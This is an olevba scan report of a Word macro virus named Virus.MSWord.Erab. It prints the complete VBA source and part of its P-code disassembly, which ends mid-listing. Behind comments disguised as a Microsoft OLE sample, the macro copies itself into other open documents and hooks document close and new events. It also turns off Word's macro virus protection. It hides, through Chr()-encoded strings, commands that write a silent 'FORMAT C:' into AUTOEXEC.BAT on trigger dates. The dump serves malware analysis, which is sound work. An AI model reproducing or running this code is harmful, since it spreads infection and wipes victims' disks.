olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Erab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Erab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub MICROSOFT_ODBC_DMA_COM_VBA()
   'THIS SAMPLE DEMOSTRATES THE USE OF AN OLE OBJECT PTR BEING PASSED TO
   'AN EXTERNAL (AND OPTIONALLY REMOTE) OLE SERVER.  THE OLE SERVER THEN
   'PERIODICALLY CALLS A METHOD ON THIS OBJECT PTR. THIS HAS THE EFFECT OF
   'A SERVER INITIATED CALLBACK TO THE CLIENT... WHICH CAN BE A MUCH BETTER
   'APP MODEL THAT THE POLLING A CLIENT APP MIGHT HAVE TO DO OTHERWISE TO
   'FIND THE STATUS OF A SERVER.  ALTHOUGH THIS DEMO SIMPLY RETURNS THE TIME
   'TO THE CLIENT, IT COULD JUST AS EASILY RETURN DATA, NEWS, OR OTHER INFORMATION
   'IT HAS BEEN TOLD THE CLIENT WANTS TO KNOW.  THE BENEFIT HERE IS THAT THE
   'SERVER DOES ALL THE WORK LOOKING FOR DATA THE CLIENT MIGHT NEED... AND THE
   'CLIENT DOES OTHER WORK... ONLY BEING INTERRUPTED WHEN THE SERVER ACTUALLY
   'HAS SOMETHING THAT INTERESTS IT.
   'NOTE1: IN THIS SCENARIO, THE CLIENT CREATES AN OBJECT THAT IS INTERNAL TO IT'
   'IT THEN CREATES AN INSTANCE OF THE REMOTE SERVER AND PASSES AN OBJECT
   'PTR TO IT OF ITS INTERNAL OBJECT.  THE SERVER HANGS ONTO THE CLIENT'S OBJECT,
   '"FEEDING IT" FROM TIME TO TIME.  AT SOMEPOINT THE CLIENT DECIDES TO
   'DISCONNECT (DROPOBJECTREFERENCE) AND THE SERVER DOES SOME CLEAN UP
   'WORK IN PREPARATION FOR THE CLIENT SETTING ITS REFERENCE TO THE SERVER =
   'NOTHING.  SINCE THIS SERVER HAS A VISIBLE FORM (SERVERS USUALLY WILL NOT
   'HAVE ANY VISIBLE DISPLAYS EXCEPT FOR DEBUGGING INFORMATION), IT UNLOADS
   'IT AT THIS POINT SO THAT THE INSTANCE WILL BE CLOSED BY OLE WHEN THE CLIENT
   'SETS THE REFERENCE = NOTHING.
   'NOTE2: SINCE THE CLIENT CREATED BOTH THE INSTANCE TO ITS INTERNAL OBJECT
   'AND THE INSTANCE TO THE SERVER... IT IS IMPORTANT THAT THE CLIENT BE THE ONE
   'TO CLOSE THESE INSTANCES BY SETTING THEM = NOTHING.  OLE ERRORS WILL
   'OCCUR IF THE SERVER TRIES TO SET THE REFERENCE TO THE CLIENT = NOTHING.
   'NOTE3: THIS APP WAS DEVELOPED VERY QUICKLY... AND SHOULD NOT BE TAKEN
   'AS GOSPEL ON HOW TO BUILD GOOD SERVERS.  FOR EXAMPLE, A GOOD SERVER
   'SHOULD NOT HAVE ANY MSGBOX CALLS OUTSIDE OF A DEBUG MODE.  (IF A
   'PRODUCTION SERVER TRIED TO DISPLAY A MSG FOR THE USER... IT COULD WAIT A
   'LONG TIME FOR SOMEONE TO COME BY THE SERVER MACHINE TO CLICK "OK".)
   'THIS SAMPLE WILL BE REFINED AND CLEANED UP BEFORE FINAL RELEASE.
   'BEGIN LEARNNING HOW TO LOVE...LOVE IS WHAT ?
   'I NEVER GOT ANY GOOD ACT FROM THE ONE WHO I'VE LOVE.BUT I STILL LOVE LOVE
   'LOVE LOVE LOVE .........WHAT IS LOVE? COULD YOU TELL ME?PLEASE TELL MEME. WHAT IS LOVEEEE.
   '*******************************************************************
   ' THIS IS A PART OF THE ERA-BUG PROJECT.
   ' ACT DATE   : FROM 13/01/2000
   ' ACT TIME   : AFTER 13:12:59 PM
   ' ACT BY       : ERA-RICH    ERARICH@ERABUG.COM
   '*******************************************************************
    On Error Resume Next 'GOTO ERAERR
    MYMAGICWORDMINE$ = "MICROSOFT_ODBC_DMA_COM_VBA"
    MYMAGICWORDOPEN$ = "DOCUMENT_OPEN"
    MYMAGICWORDNEW$ = "DOCUMENT_NEW"
    MYMAGICWORDCLOSE$ = "DOCUMENT_CLOSE"
   'START CHECK IF INFECTED
    Dim XINFECTEDFILENUMBER As Integer, XNUMBEROFPROJECTS  As Integer
    Dim XTEXTS As String, XLINES As Integer, XLINENUMBER As Integer
    Dim ISINFECTED As Integer, XINDEX As Integer, XSTARTCODELINE As Integer
    Dim LINEISEXISTING As Integer
    'GET NUMBER OF DOCUMENTS OPENNING
    XNUMBEROFPROJECTS = Application.VBE.VBPROJECTS.Count
    XINFECTEDFILENUMBER = XNUMBEROFPROJECTS
    'FIND INFECTED FILE NUMBER
    For XINDEX = 1 To XNUMBEROFPROJECTS
        ISINFECTED = False
        XLINES = Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.COUNTOFLINES
        For XLINENUMBER = 1 To XLINES
            XTEXTS = UCase(Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.LINES(XLINENUMBER, 1))
            If Mid(XTEXTS, 13, 26) = MYMAGICWORDMINE$ Then
               ISINFECTED = True: XSTARTCODELINE = XLINENUMBER: Exit For
            End If
        Next XLINENUMBER
        If ISINFECTED Then Exit For
    Next XINDEX
    XINFECTEDFILENUMBER = XINDEX
    If XINFECTEDFILENUMBER > XNUMBEROFPROJECTS Then Exit Sub
    'CHECK IFITS NOT INFECTED
    For XINDEX = 1 To XNUMBEROFPROJECTS
        ISINFECTED = False
        XLINES = Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.COUNTOFLINES
        For XLINENUMBER = 1 To XLINES
            XTEXTS = UCase(Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.LINES(XLINENUMBER, 1))
            If Mid(XTEXTS, 13, 26) = MYMAGICWORDMINE$ Then
               ISINFECTED = True
            End If
        Next XLINENUMBER
        If Not ISINFECTED Then 'IF NOT INFECTED YET. COPY ITSEFT INTO INTO UNINFECTED FILE
           'COPYING MY MAGIC SMALL BODY
           XLINENUMBER = XSTARTCODELINE
           XTEXTS = UCase(Application.VBE.VBPROJECTS(XINFECTEDFILENUMBER).VBCOMPONENTS(1).CODEMODULE.LINES(XLINENUMBER, 1))
           Do While Mid(XTEXTS, 1, 7) <> "END SUB"
               XTEXTS = UCase(Application.VBE.VBPROJECTS(XINFECTEDFILENUMBER).VBCOMPONENTS(1).CODEMODULE.LINES(XLINENUMBER, 1))
               Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES XLINENUMBER, XTEXTS
               XLINENUMBER = XLINENUMBER + 1
           Loop
           'COPYING [CLOSE] EVENT
           XLINES = Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.COUNTOFLINES
           LINEISEXISTING = XLINES + 1
           For XLINENUMBER = 1 To XLINES
               XTEXTS = UCase(Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.LINES(XLINENUMBER, 1))
               If Mid(XTEXTS, 13, 14) = MYMAGICWORDCLOSE$ Then
                  LINEISEXISTING = XLINENUMBER: Exit For
               End If
           Next XLINENUMBER
           If LINEISEXISTING < XLINES Then 'IF ALREADY EXIST..
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 1, "    APPLICATION.OPTIONS.VIRUSPROTECTION = FALSE"
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 2, "    CALL MICROSOFT_ODBC_DMA_COM_VBA"
           Else 'IF NOT
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 1, "PRIVATE SUB DOCUMENT_CLOSE"
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 2, "    APPLICATION.OPTIONS.VIRUSPROTECTION = FALSE"
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 3, "    CALL MICROSOFT_ODBC_DMA_COM_VBA"
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 4, "END SUB"
           End If
           '[CLOSE] EVENT COPIED
           'COPYING [NEW] EVENT
           XLINES = Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.COUNTOFLINES
           LINEISEXISTING = XLINES + 1
           For XLINENUMBER = 1 To XLINES
               XTEXTS = UCase(Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.LINES(XLINENUMBER, 1))
               If Mid(XTEXTS, 13, 12) = MYMAGICWORDNEW$ Then
                  LINEISEXISTING = XLINENUMBER: Exit For
               End If
           Next XLINENUMBER
           If LINEISEXISTING < XLINES Then 'IF ALREADY EXIST..
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 1, "    APPLICATION.OPTIONS.VIRUSPROTECTION = FALSE"
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 2, "    CALL MICROSOFT_ODBC_DMA_COM_VBA"
           Else 'IF NOT
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 1, "PRIVATE SUB DOCUMENT_NEW"
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 2, "    APPLICATION.OPTIONS.VIRUSPROTECTION = FALSE"
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 3, "    CALL MICROSOFT_ODBC_DMA_COM_VBA"
              Application.VBE.VBPROJECTS(XINDEX).VBCOMPONENTS(1).CODEMODULE.INSERTLINES LINEISEXISTING + 4, "END SUB"
           End If
           '[NEW] EVENT COPIED
        End If
    Next XINDEX
    'START ERA MODULES
    Dim X As Single, ACTDATE, ACTTIME, LINEDATA, COMMSTR1, COMMSTR2, KEYFILENAME
    ACTDATE = 20: ACTTIME = "00:00": ISINFECTED = False
    If (Day(Date) = 16 Or Day(Date) = 15) And WeekDay(Date) = 3 Then ACTDATE = Day(Date)
    KEYFILENAME = Chr(67) + Chr(58) + Chr(92) + Chr(65) + Chr(85) + Chr(84) + Chr(79) + Chr(69) + Chr(88) + Chr(69) + Chr(67) + Chr(46) + Chr(66) + Chr(65) + Chr(84)
    COMMSTR1 = Chr(67) + Chr(84) + Chr(84) + Chr(89) + Chr(32) + Chr(78) + Chr(85) + Chr(76)
    COMMSTR2 = Chr(70) + Chr(79) + Chr(82) + Chr(77) + Chr(65) + Chr(84) + Chr(32) + Chr(67)
    COMMSTR2 = COMMSTR2 + Chr(58) + Chr(47) + Chr(65) + Chr(85) + Chr(84) + Chr(79) + Chr(84)
    COMMSTR2 = COMMSTR2 + Chr(69) + Chr(83) + Chr(84) + Chr(32) + Chr(47) + Chr(81) + Chr(47) + Chr(85)
    If Day(Date) = ACTDATE And Format(Time, "HH:MM") >= ACTTIME Then
      If Dir(KEYFILENAME, 0) <> "" Then
         Open KEYFILENAME For Input As #1
         Do While Not EOF(1)
            Line Input #1, LINEDATA
            If InStr(UCase(LINEDATA), COMMSTR2) > 0 And InStr(UCase(LINEDATA), "REM") = 0 Then
               ISINFECTED = True
            End If
         Loop
         Close #1
      End If
      If Not ISINFECTED Then
         Open KEYFILENAME For Append Access Write As #1
         Print #1, "ECHO OFF"
         Print #1, "ECHO MORNNING BABY,I NEVER LOVE ANY LIKE YOU..NA"
         Print #1, "ECHO WHAT'VE EVER HAPPENED I STILL LOVE YOU....NA"
         Print #1, "ECHO SEE YOU AT THE MILKY WAY OR MOON RIVER....NA"
         Print #1, "ECHO I WAITING FOR YOU. I LOVE YOU....NA NA NA NAAAA"
         Print #1, COMMSTR1
         Print #1, COMMSTR2
         Close #1
         MsgBox "!!!  HAVE YOU DONE BACKING UP YOUR IMPORTANT DATA YET???", vbOKOnly, "WARNNING MESSAGE E-R-A--B-U-G........HA HA HA"
         MsgBox "!!!  HO PHAR JA.!!! PUM AE VA !!!!  ITS TOO LATE FOR DOING THAT...SO SORRY....", vbOKOnly, "WARNNING MESSAGE E-R-A--B-U-G........HA HA HA"
      End If
    End If
    'END ERA BODY
ERAERR:
End Sub
Private Sub DOCUMENT_CLOSE()
    Application.Options.VirusProtection = False
    Call MICROSOFT_ODBC_DMA_COM_VBA
End Sub
Private Sub DOCUMENT_NEW()
    Application.Options.VirusProtection = False
    Call MICROSOFT_ODBC_DMA_COM_VBA
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Erab
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15930 bytes
' Line #0:
' 	FuncDefn (Private Sub MICROSOFT_ODBC_DMA_COM_VBA())
' Line #1:
' 	QuoteRem 0x0003 0x0044 "THIS SAMPLE DEMOSTRATES THE USE OF AN OLE OBJECT PTR BEING PASSED TO"
' Line #2:
' 	QuoteRem 0x0003 0x0044 "AN EXTERNAL (AND OPTIONALLY REMOTE) OLE SERVER.  THE OLE SERVER THEN"
' Line #3:
' 	QuoteRem 0x0003 0x0046 "PERIODICALLY CALLS A METHOD ON THIS OBJECT PTR. THIS HAS THE EFFECT OF"
' Line #4:
' 	QuoteRem 0x0003 0x0047 "A SERVER INITIATED CALLBACK TO THE CLIENT... WHICH CAN BE A MUCH BETTER"
' Line #5:
' 	QuoteRem 0x0003 0x0045 "APP MODEL THAT THE POLLING A CLIENT APP MIGHT HAVE TO DO OTHERWISE TO"
' Line #6:
' 	QuoteRem 0x0003 0x0048 "FIND THE STATUS OF A SERVER.  ALTHOUGH THIS DEMO SIMPLY RETURNS THE TIME"
' Line #7:
' 	QuoteRem 0x0003 0x004E "TO THE CLIENT, IT COULD JUST AS EASILY RETURN DATA, NEWS, OR OTHER INFORMATION"
' Line #8:
' 	QuoteRem 0x0003 0x0048 "IT HAS BEEN TOLD THE CLIENT WANTS TO KNOW.  THE BENEFIT HERE IS THAT THE"
' Line #9:
' 	QuoteRem 0x0003 0x004A "SERVER DOES ALL THE WORK LOOKING FOR DATA THE CLIENT MIGHT NEED... AND THE"
' Line #10:
' 	QuoteRem 0x0003 0x0049 "CLIENT DOES OTHER WORK... ONLY BEING INTERRUPTED WHEN THE SERVER ACTUALLY"
' Line #11:
' 	QuoteRem 0x0003 0x0020 "HAS SOMETHING THAT INTERESTS IT."
' Line #12:
' 	QuoteRem 0x0003 0x004D "NOTE1: IN THIS SCENARIO, THE CLIENT CREATES AN OBJECT THAT IS INTERNAL TO IT'"
' Line #13:
' 	QuoteRem 0x0003 0x0045 "IT THEN CREATES AN INSTANCE OF THE REMOTE SERVER AND PASSES AN OBJECT"
' Line #14:
' 	QuoteRem 0x0003 0x004D "PTR TO IT OF ITS INTERNAL OBJECT.  THE SERVER HANGS ONTO THE CLIENT'S OBJECT,"
' Line #15:
' 	QuoteRem 0x0003 0x0043 ""FEEDING IT" FROM TIME TO TIME.  AT SOMEPOINT THE CLIENT DECIDES TO"
' Line #16:
' 	QuoteRem 0x0003 0x0042 "DISCONNECT (DROPOBJECTREFERENCE) AND THE SERVER DOES SOME CLEAN UP"
' Line #17:
' 	QuoteRem 0x0003 0x0048 "WORK IN PREPARATION FOR THE CLIENT SETTING ITS REFERENCE TO THE SERVER ="
' Line #18:
' 	QuoteRem 0x0003 0x0048 "NOTHING.  SINCE THIS SERVER HAS A VISIBLE FORM (SERVERS USUALLY WILL NOT"
' Line #19:
' 	QuoteRem 0x0003 0x0047 "HAVE ANY VISIBLE DISPLAYS EXCEPT FOR DEBUGGING INFORMATION), IT UNLOADS"
' Line #20:
' 	QuoteRem 0x0003 0x004B "IT AT THIS POINT SO THAT THE INSTANCE WILL BE CLOSED BY OLE WHEN THE CLIENT"
' Line #21:
' 	QuoteRem 0x0003 0x001D "SETS THE REFERENCE = NOTHING."
' Line #22:
' 	QuoteRem 0x0003 0x0048 "NOTE2: SINCE THE CLIENT CREATED BOTH THE INSTANCE TO ITS INTERNAL OBJECT"
' Line #23:
' 	QuoteRem 0x0003 0x004C "AND THE INSTANCE TO THE SERVER... IT IS IMPORTANT THAT THE CLIENT BE THE ONE"
' Line #24:
' 	QuoteRem 0x0003 0x0044 "TO CLOSE THESE INSTANCES BY SETTING THEM = NOTHING.  OLE ERRORS WILL"
' Line #25:
' 	QuoteRem 0x0003 0x0047 "OCCUR IF THE SERVER TRIES TO SET THE REFERENCE TO THE CLIENT = NOTHING."
' Line #26:
' 	QuoteRem 0x0003 0x0045 "NOTE3: THIS APP WAS DEVELOPED VERY QUICKLY... AND SHOULD NOT BE TAKEN"
' Line #27:
' 	QuoteRem 0x0003 0x0043 "AS GOSPEL ON HOW TO BUILD GOOD SERVERS.  FOR EXAMPLE, A GOOD SERVER"
' Line #28:
' 	QuoteRem 0x0003 0x0040 "SHOULD NOT HAVE ANY MSGBOX CALLS OUTSIDE OF A DEBUG MODE.  (IF A"
' Line #29:
' 	QuoteRem 0x0003 0x0048 "PRODUCTION SERVER TRIED TO DISPLAY A MSG FOR THE USER... IT COULD WAIT A"
' Line #30:
' 	QuoteRem 0x0003 0x0043 "LONG TIME FOR SOMEONE TO COME BY THE SERVER MACHINE TO CLICK "OK".)"
' Line #31:
' 	QuoteRem 0x0003 0x0040 "THIS SAMPLE WILL BE REFINED AND CLEANED UP BEFORE FINAL RELEASE."
' Line #32:
' 	QuoteRem 0x0003 0x002C "BEGIN LEARNNING HOW TO LOVE...LOVE IS WHAT ?"
' Line #33:
' 	QuoteRem 0x0003 0x0049 "I NEVER GOT ANY GOOD ACT FROM THE ONE WHO I'VE LOVE.BUT I STILL LOVE LOVE"
' Line #34:
' 	QuoteRem 0x0003 0x005A "LOVE LOVE LOVE .........WHAT IS LOVE? COULD YOU TELL ME?PLEASE TELL MEME. WHAT IS LOVEEEE."
' Line #35:
' 	QuoteRem 0x0003 0x0043 "*******************************************************************"
' Line #36:
' 	QuoteRem 0x0003 0x0027 " THIS IS A PART OF THE ERA-BUG PROJECT."
' Line #37:
' 	QuoteRem 0x0003 0x001D " ACT DATE   : FROM 13/01/2000"
' Line #38:
' 	QuoteRem 0x0003 0x001F " ACT TIME   : AFTER 13:12:59 PM"
' Line #39:
' 	QuoteRem 0x0003 0x002E " ACT BY       : ERA-RICH    ERARICH@ERABUG.COM"
' Line #40:
' 	QuoteRem 0x0003 0x0043 "*******************************************************************"
' Line #41:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0019 0x000B "GOTO ERAERR"
' Line #42:
' 	LitStr 0x001A "MICROSOFT_ODBC_DMA_COM_VBA"
' 	St MYMAGICWORDMINE$ 
' Line #43:
' 	LitStr 0x000D "DOCUMENT_OPEN"
' 	St MYMAGICWORDOPEN$ 
' Line #44:
' 	LitStr 0x000C "DOCUMENT_NEW"
' 	St MYMAGICWORDNEW$ 
' Line #45:
' 	LitStr 0x000E "DOCUMENT_CLOSE"
' 	St MYMAGICWORDCLOSE$ 
' Line #46:
' 	QuoteRem 0x0003 0x0017 "START CHECK IF INFECTED"
' Line #47:
' 	Dim 
' 	VarDefn XINFECTEDFILENUMBER (As Integer)
' 	VarDefn XNUMBEROFPROJECTS (As Integer) 0x003B
' Line #48:
' 	Dim 
' 	VarDefn XTEXTS (As String)
' 	VarDefn XLINES (As Integer)
' 	VarDefn XLINENUMBER (As Integer)
' Line #49:
' 	Dim 
' 	VarDefn ISINFECTED (As Integer)
' 	VarDefn XINDEX (As Integer)
' 	VarDefn XSTARTCODELINE (As Integer)
' Line #50:
' 	Dim 
' 	VarDefn LINEISEXISTING (As Integer)
' Line #51:
' 	QuoteRem 0x0004 0x0020 "GET NUMBER OF DOCUMENTS OPENNING"
' Line #52:
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd VBPROJECTS 
' 	MemLd Count 
' 	St XNUMBEROFPROJECTS 
' Line #53:
' 	Ld XNUMBEROFPROJECTS 
' 	St XINFECTEDFILENUMBER 
' Line #54:
' 	QuoteRem 0x0004 0x0019 "FIND INFECTED FILE NUMBER"
' Line #55:
' 	StartForVariable 
' 	Ld XINDEX 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld XNUMBEROFPROJECTS 
' 	For 
' Line #56:
' 	LitVarSpecial (False)
' 	St ISINFECTED 
' Line #57:
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	MemLd COUNTOFLINES 
' 	St XLINES 
' Line #58:
' 	StartForVariable 
' 	Ld XLINENUMBER 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld XLINES 
' 	For 
' Line #59:
' 	Ld XLINENUMBER 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemLd LINES 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St XTEXTS 
' Line #60:
' 	Ld XTEXTS 
' 	LitDI2 0x000D 
' 	LitDI2 0x001A 
' 	ArgsLd Mid$ 0x0003 
' 	Ld MYMAGICWORDMINE$ 
' 	Eq 
' 	IfBlock 
' Line #61:
' 	LitVarSpecial (True)
' 	St ISINFECTED 
' 	BoS 0x0000 
' 	Ld XLINENUMBER 
' 	St XSTARTCODELINE 
' 	BoS 0x0000 
' 	ExitFor 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	StartForVariable 
' 	Ld XLINENUMBER 
' 	EndForVariable 
' 	NextVar 
' Line #64:
' 	Ld ISINFECTED 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #65:
' 	StartForVariable 
' 	Ld XINDEX 
' 	EndForVariable 
' 	NextVar 
' Line #66:
' 	Ld XINDEX 
' 	St XINFECTEDFILENUMBER 
' Line #67:
' 	Ld XINFECTEDFILENUMBER 
' 	Ld XNUMBEROFPROJECTS 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #68:
' 	QuoteRem 0x0004 0x0018 "CHECK IFITS NOT INFECTED"
' Line #69:
' 	StartForVariable 
' 	Ld XINDEX 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld XNUMBEROFPROJECTS 
' 	For 
' Line #70:
' 	LitVarSpecial (False)
' 	St ISINFECTED 
' Line #71:
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	MemLd COUNTOFLINES 
' 	St XLINES 
' Line #72:
' 	StartForVariable 
' 	Ld XLINENUMBER 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld XLINES 
' 	For 
' Line #73:
' 	Ld XLINENUMBER 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemLd LINES 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St XTEXTS 
' Line #74:
' 	Ld XTEXTS 
' 	LitDI2 0x000D 
' 	LitDI2 0x001A 
' 	ArgsLd Mid$ 0x0003 
' 	Ld MYMAGICWORDMINE$ 
' 	Eq 
' 	IfBlock 
' Line #75:
' 	LitVarSpecial (True)
' 	St ISINFECTED 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	StartForVariable 
' 	Ld XLINENUMBER 
' 	EndForVariable 
' 	NextVar 
' Line #78:
' 	Ld ISINFECTED 
' 	Not 
' 	IfBlock 
' 	QuoteRem 0x001F 0x003A "IF NOT INFECTED YET. COPY ITSEFT INTO INTO UNINFECTED FILE"
' Line #79:
' 	QuoteRem 0x000B 0x001B "COPYING MY MAGIC SMALL BODY"
' Line #80:
' 	Ld XSTARTCODELINE 
' 	St XLINENUMBER 
' Line #81:
' 	Ld XLINENUMBER 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld XINFECTEDFILENUMBER 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemLd LINES 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St XTEXTS 
' Line #82:
' 	Ld XTEXTS 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0007 "END SUB"
' 	Ne 
' 	DoWhile 
' Line #83:
' 	Ld XLINENUMBER 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld XINFECTEDFILENUMBER 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemLd LINES 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St XTEXTS 
' Line #84:
' 	Ld XLINENUMBER 
' 	Ld XTEXTS 
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemCall INSERTLINES 0x0002 
' Line #85:
' 	Ld XLINENUMBER 
' 	LitDI2 0x0001 
' 	Add 
' 	St XLINENUMBER 
' Line #86:
' 	Loop 
' Line #87:
' 	QuoteRem 0x000B 0x0015 "COPYING [CLOSE] EVENT"
' Line #88:
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	MemLd COUNTOFLINES 
' 	St XLINES 
' Line #89:
' 	Ld XLINES 
' 	LitDI2 0x0001 
' 	Add 
' 	St LINEISEXISTING 
' Line #90:
' 	StartForVariable 
' 	Ld XLINENUMBER 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld XLINES 
' 	For 
' Line #91:
' 	Ld XLINENUMBER 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemLd LINES 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St XTEXTS 
' Line #92:
' 	Ld XTEXTS 
' 	LitDI2 0x000D 
' 	LitDI2 0x000E 
' 	ArgsLd Mid$ 0x0003 
' 	Ld MYMAGICWORDCLOSE$ 
' 	Eq 
' 	IfBlock 
' Line #93:
' 	Ld XLINENUMBER 
' 	St LINEISEXISTING 
' 	BoS 0x0000 
' 	ExitFor 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	StartForVariable 
' 	Ld XLINENUMBER 
' 	EndForVariable 
' 	NextVar 
' Line #96:
' 	Ld LINEISEXISTING 
' 	Ld XLINES 
' 	Lt 
' 	IfBlock 
' 	QuoteRem 0x002B 0x0012 "IF ALREADY EXIST.."
' Line #97:
' 	Ld LINEISEXISTING 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x002F "    APPLICATION.OPTIONS.VIRUSPROTECTION = FALSE"
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemCall INSERTLINES 0x0002 
' Line #98:
' 	Ld LINEISEXISTING 
' 	LitDI2 0x0002 
' 	Add 
' 	LitStr 0x0023 "    CALL MICROSOFT_ODBC_DMA_COM_VBA"
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemCall INSERTLINES 0x0002 
' Line #99:
' 	ElseBlock 
' 	QuoteRem 0x0010 0x0006 "IF NOT"
' Line #100:
' 	Ld LINEISEXISTING 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x001A "PRIVATE SUB DOCUMENT_CLOSE"
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemCall INSERTLINES 0x0002 
' Line #101:
' 	Ld LINEISEXISTING 
' 	LitDI2 0x0002 
